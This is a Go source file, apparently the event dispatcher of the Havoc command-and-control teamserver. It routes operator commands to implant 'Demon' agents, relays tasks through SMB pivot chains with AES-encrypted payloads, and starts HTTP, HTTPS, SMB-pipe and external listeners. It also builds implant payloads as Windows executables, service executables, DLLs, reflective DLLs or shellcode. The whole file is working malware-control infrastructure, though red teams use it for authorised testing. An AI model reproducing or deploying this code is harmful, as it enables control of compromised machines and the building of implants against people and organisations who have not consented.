package teamserver

import (
    "encoding/json"
    "errors"
    "fmt"
    "strconv"
    "strings"
    "time"

    "Havoc/pkg/common/builder"
    "Havoc/pkg/common/packer"
    "Havoc/pkg/demons"
    "Havoc/pkg/events"
    "Havoc/pkg/handlers"
    "Havoc/pkg/logger"
    "Havoc/pkg/logr"
    "Havoc/pkg/packager"
    "Havoc/pkg/utils"
)

func (t *Teamserver) DispatchEvent(pk packager.Package) {
    switch pk.Head.Event {

    case packager.Type.Session.Type:

        switch pk.Body.SubEvent {

        case packager.Type.Session.MarkAsDead:
            if AgentID, ok := pk.Body.Info["AgentID"]; ok {
                for i := range t.Agents.Agents {
                    if t.Agents.Agents[i].NameID == AgentID {

                        if val, ok := pk.Body.Info["Marked"]; ok {
                            if val == "Dead" {
                                t.Agents.Agents[i].Active = false
                            } else if val == "Alive" {
                                t.Agents.Agents[i].Active = true
                            }
                        }

                    }
                }
            }

            break

        case packager.Type.Session.Input:
            logger.Debug(pk.Body.Info)

            var (
                job       demons.DemonJob
                command   = 0
                AgentType = "Demon"
                err       error
                DemonID   string
            )

            if agentID, ok := pk.Body.Info["DemonID"].(string); ok {
                DemonID = agentID
            } else {
                logger.Debug("AgentID [" + agentID + "] not found")
                return
            }

            if val, ok := pk.Body.Info["CommandID"]; ok {
                if pk.Body.Info["CommandID"] == "Python Plugin" {
                    logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02-01-2006 15:04:05"))
                    return
                } else {
                    command, err = strconv.Atoi(val.(string))
                    if err != nil {
                        logger.Error("Failed to convert CommandID to integer: " + err.Error())
                        command = 0
                    }
                }
            }

            for i := range t.Agents.Agents {
                if t.Agents.Agents[i].NameID == DemonID {

                    if t.Agents.Agents[i].Info.MagicValue == demons.DEMON_MAGIC_VALUE {
                        logger.Debug("Is Demon")

                        if command == 0 {
                            break
                        }

                        job, err = demons.TaskPrepare(pk.Body.Info["TaskID"].(string), command, pk.Body.Info)
                        if err != nil {
                            logger.Error("Failed to create Task: " + err.Error())
                            return
                        }

                        logger.Debug(fmt.Sprintf("Task => CommandID:[%d] TaskID:[%x]\n", job.Command, job.TaskID))

                        if t.Agents.Agents[i].Pivots.Parent != nil {

                            logger.Debug("Prepare command for pivot demon: " + t.Agents.Agents[i].NameID)

                            var (
                                Payload = demons.BuildPayloadMessage([]demons.DemonJob{job}, t.Agents.Agents[i].Encryption.AESKey, t.Agents.Agents[i].Encryption.AESIv)
                                Packer  = packer.NewPacker(nil, nil)
                            )

                            DemonID32, err := strconv.ParseInt(t.Agents.Agents[i].NameID, 16, 32)
                            if err != nil {
                                logger.Error("DemonID32: " + err.Error())
                            }

                            Packer.AddInt32(int32(DemonID32))
                            Packer.AddBytes(Payload)

                            // TODO: rewrite this and use AgentHeader instead.
                            var PivotJob = demons.DemonJob{
                                Command: demons.COMMAND_PIVOT,
                                Data: []interface{}{
                                    demons.DEMON_PIVOT_SMB_COMMAND,
                                    DemonID32,
                                    Packer.Buffer(),
                                },
                            }

                            t.Agents.Agents[i].Pivots.Parent.AddJobToQueue(PivotJob)
                            logr.LogrInstance.AddAgentInput("Demon", t.Agents.Agents[i].NameID, pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02-01-2006 15:04:05"))
                        } else {
                            t.Agents.Agents[i].AddJobToQueue(job)
                            logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02-01-2006 15:04:05"))
                        }

                    } else {
                        logger.Debug("Is not Demon")

                        for _, agent := range t.Service.Agents {
                            if agent.MagicValue == fmt.Sprintf("0x%x", t.Agents.Agents[i].Info.MagicValue) {

                                // Set agent type
                                AgentType = agent.Name

                                // Send command to agent service
                                agent.SendTask(pk.Body.Info, t.Agents.Agents[i].ToMap())

                                // log agent input
                                logr.LogrInstance.AddAgentInput(agent.Name, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02-01-2006 15:04:05"))
                            }
                        }
                    }
                }
            }

            if pk.Head.OneTime == "true" {
                return
            }

            var backups = map[string]interface{}{
                "TaskID":      pk.Body.Info["TaskID"].(string),
                "DemonID":     DemonID,
                "CommandID":   "",
                "CommandLine": pk.Body.Info["CommandLine"].(string),
                "AgentType":   AgentType,
            }

            if _, ok := pk.Body.Info["CommandID"].(string); ok {
                backups["CommandID"] = pk.Body.Info["CommandID"]
            }

            for k := range pk.Body.Info {
                delete(pk.Body.Info, k)
            }

            pk.Body.Info = backups

            t.EventAppend(pk)
            t.EventBroadcast(pk.Head.User, pk)
        }

    case packager.Type.Chat.Type:

        switch pk.Body.SubEvent {

        case packager.Type.Chat.NewMessage:
            t.EventBroadcast("", pk)
            break

        case packager.Type.Chat.NewSession:
            t.EventBroadcast("", pk)
            break

        case packager.Type.Chat.NewListener:
            t.EventBroadcast("", pk)
            break

        }

    case packager.Type.Listener.Type:
        switch pk.Body.SubEvent {

        case packager.Type.Listener.Add:

            var Protocol = pk.Body.Info["Protocol"].(string)
            switch Protocol {

            case handlers.DEMON_HTTP, handlers.DEMON_HTTPS:
                var (
                    Host    string
                    Headers []string
                    Uris    []string
                )

                logger.Debug(pk.Body.Info)

                Host = pk.Body.Info["Hosts"].(string)

                for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
                    if len(s) > 0 {
                        Headers = append(Headers, s)
                    }
                }

                for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
                    if len(s) > 0 {
                        Uris = append(Uris, s)
                    }
                }

                var Config = handlers.HTTPConfig{
                    Name:    pk.Body.Info["Name"].(string),
                    Hosts:   Host,
                    Port:    pk.Body.Info["Port"].(string),
                    Headers: Headers,
                    Uris:    Uris,
                }

                if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
                    Config.Proxy.Enabled = false

                    if val == "true" {
                        Config.Proxy.Enabled = true

                        if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
                            Config.Proxy.Type = val
                        } else {
                            for id, client := range t.Clients {
                                if client.Username == pk.Head.User {
                                    err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
                                    if err != nil {
                                        logger.Error("Failed to send Event: " + err.Error())
                                    }
                                }
                            }
                        }

                        if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
                            Config.Proxy.Host = val
                        } else {
                            for id, client := range t.Clients {
                                if client.Username == pk.Head.User {
                                    err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
                                    if err != nil {
                                        logger.Error("Failed to send Event: " + err.Error())
                                    }
                                }
                            }
                        }

                        if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
                            Config.Proxy.Port = val
                        } else {
                            for id, client := range t.Clients {
                                if client.Username == pk.Head.User {
                                    err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
                                    if err != nil {
                                        logger.Error("Failed to send Event: " + err.Error())
                                    }
                                }
                            }
                            return
                        }

                        if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
                            Config.Proxy.Username = val
                        } else {
                            for id, client := range t.Clients {
                                if client.Username == pk.Head.User {
                                    err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
                                    if err != nil {
                                        logger.Error("Failed to send Event: " + err.Error())
                                    }
                                }
                            }
                            return
                        }

                        if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
                            Config.Proxy.Password = val
                        } else {
                            for id, client := range t.Clients {
                                if client.Username == pk.Head.User {
                                    err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
                                    if err != nil {
                                        logger.Error("Failed to send Event: " + err.Error())
                                    }
                                }
                            }
                            return
                        }
                    }
                }

                if pk.Body.Info["Secure"].(string) == "true" {
                    Config.Secure = true
                }

                if err := t.StartListener(handlers.LISTENER_HTTP, Config); err != nil {
                    for id, client := range t.Clients {
                        if client.Username == pk.Head.User {
                            err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
                            if err != nil {
                                logger.Error("Failed to send Event: " + err.Error())
                            }
                        }
                    }
                }

                break

            case handlers.DEMON_PIVOT_SMB:
                var (
                    SmdConfig handlers.SMBConfig
                    found     bool
                )

                SmdConfig.Name, found = pk.Body.Info["Name"].(string)
                if !found {
                    SmdConfig.Name = ""
                }

                SmdConfig.PipeName, found = pk.Body.Info["PipeName"].(string)
                if !found {
                    SmdConfig.Name = ""
                }

                if err := t.StartListener(handlers.LISTENER_PIVOT_SMB, SmdConfig); err != nil {
                    for id, client := range t.Clients {
                        if client.Username == pk.Head.User {
                            err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
                            if err != nil {
                                logger.Error("Failed to send Event: " + err.Error())
                            }
                        }
                    }
                }

                break

            case handlers.DEMON_EXTERNAL:
                var (
                    ExtConfig handlers.ExternalConfig
                    found     bool
                )

                ExtConfig.Name, found = pk.Body.Info["Name"].(string)
                if !found {
                    ExtConfig.Name = ""
                }

                ExtConfig.Endpoint, found = pk.Body.Info["Endpoint"].(string)
                if !found {
                    logger.Error("Listener SMB Pivot: Endpoint not specified")
                    return
                }

                if err := t.StartListener(handlers.LISTENER_EXTERNAL, ExtConfig); err != nil {
                    for id, client := range t.Clients {
                        if client.Username == pk.Head.User {
                            err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
                            if err != nil {
                                logger.Error("Failed to send Event: " + err.Error())
                            }
                        }
                    }
                }

                break

            default:
                logger.Error("Listener Type not found: ", Protocol)
                break
            }

            break

        case packager.Type.Listener.Remove: // TODO:
            logger.Info("remove listener...")
            break

        case packager.Type.Listener.Edit:
            logger.Info("edit listener...")
            break

        case packager.Type.Listener.Offline:
            logger.Info("offline listener...")
            break

        case packager.Type.Listener.Online:
            logger.Info("online listener...")
            break
        }

    case packager.Type.Gate.Type:

        switch pk.Body.SubEvent {
        case packager.Type.Gate.Stageless:
            var (
                AgentType      = pk.Body.Info["AgentType"].(string)
                ListenerName   = pk.Body.Info["Listener"].(string)
                Arch           = pk.Body.Info["Arch"].(string)
                Format         = pk.Body.Info["Format"].(string)
                Config         = pk.Body.Info["Config"].(string)
                SendConsoleMsg func(MsgType, Message string)
                ClientID       string
            )

            for _, client := range t.Clients {
                if client.Username == pk.Head.User {
                    ClientID = client.ClientID
                }
            }

            SendConsoleMsg = func(MsgType, Message string) {
                err := t.SendEvent(ClientID, events.Gate.SendConsoleMessage(MsgType, Message))
                if err != nil {
                    logger.Error("Couldn't send Event: " + err.Error())
                    return
                }
            }

            if AgentType == "Demon" {
                go func() {
                    var ConfigMap = make(map[string]any)

                    err := json.Unmarshal([]byte(Config), &ConfigMap)
                    if err != nil {
                        logger.Error("Failed to Unmarshal json to object: " + err.Error())
                        return
                    }

                    var PayloadBuilder = builder.NewBuilder()

                    PayloadBuilder.DebugMode(t.Flags.Server.DebugDev)

                    PayloadBuilder.ClientId = ClientID

                    if PayloadBuilder.ClientId == "" {
                        logger.Error("Couldn't find the Client")
                        return
                    }

                    PayloadBuilder.SendConsoleMessage = SendConsoleMsg

                    err = PayloadBuilder.SetConfig(Config)
                    if err != nil {
                        return
                    }

                    if Arch == "x64" {
                        PayloadBuilder.SetArch(builder.ARCHITECTURE_X64)
                    } else {
                        PayloadBuilder.SetArch(builder.ARCHITECTURE_X86)
                    }

                    var Ext string
                    logger.Debug(Format)
                    if Format == "Windows Exe" {
                        PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_EXE)
                        Ext = ".exe"
                    } else if Format == "Windows Service Exe" {
                        PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_SERVICE_EXE)
                        Ext = ".exe"
                    } else if Format == "Windows Dll" {
                        PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_DLL)
                        Ext = ".dll"
                    } else if Format == "Windows Reflective Dll" {
                        PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_REFLECTIVE_DLL)
                        Ext = ".dll"
                    } else if Format == "Windows Shellcode" {
                        PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_RAW_BINARY)
                        Ext = ".bin"
                    } else {
                        logger.Error("Unknown Format: " + Format)
                        return
                    }

                    for i := 0; i < len(t.Listeners); i++ {
                        if t.Listeners[i].Name == ListenerName {
                            PayloadBuilder.SetListener(t.Listeners[i].Type, t.Listeners[i].Config)
                        }
                    }

                    PayloadBuilder.SetOutputPath("/tmp/" + utils.GenerateID(10) + Ext)

                    if t.Profile.Config.Demon != nil {
                        if t.Profile.Config.Demon.Binary != nil {
                            PayloadBuilder.SetPatchConfig(t.Profile.Config.Demon.Binary.Header)
                        }
                    }

                    if PayloadBuilder.Build() {
                        pal := PayloadBuilder.GetPayloadBytes()
                        if len(pal) > 0 {
                            err := t.SendEvent(PayloadBuilder.ClientId, events.Gate.SendStageless("demon"+Ext, pal))
                            if err != nil {
                                logger.Error("Error while sending event: " + err.Error())
                                return
                            }
                        }
                    }
                }()
            } else {
                // send to Services
                for _, Agent := range t.Service.Agents {
                    if Agent.Name == AgentType {
                        var ConfigMap = make(map[string]any)

                        err := json.Unmarshal([]byte(Config), &ConfigMap)
                        if err != nil {
                            logger.Error("Failed to Unmarshal json to object: " + err.Error())
                            SendConsoleMsg("Error", "Failed to Unmarshal json to object: "+err.Error())
                            return
                        }

                        var Options = map[string]any{
                            "Listener": t.ListenerGetInfo(ListenerName),
                            "Arch":     Arch,
                            "Format":   Format,
                        }

                        Agent.SendAgentBuildRequest(ClientID, ConfigMap, Options)
                    }
                }

            }
        }
    }
}
